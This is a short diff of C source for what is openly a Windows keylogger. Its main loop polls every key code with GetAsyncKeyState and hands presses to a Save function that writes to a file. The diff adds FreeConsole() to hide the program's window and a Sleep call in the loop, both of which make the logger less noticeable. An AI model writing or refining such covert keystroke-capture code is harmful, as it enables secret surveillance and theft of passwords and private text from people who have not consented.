@@ -18,9 +18,12 @@ int Save(int _key, char *file);
 
 int main() {
   
+  FreeConsole();
+  
   char  i;
   
   while(true) {
+    Sleep(10);
     for(i = 8; i <= 255; i++) {
       // if button is pressed
       if (GetAsyncKeyState(i) == -32767) {
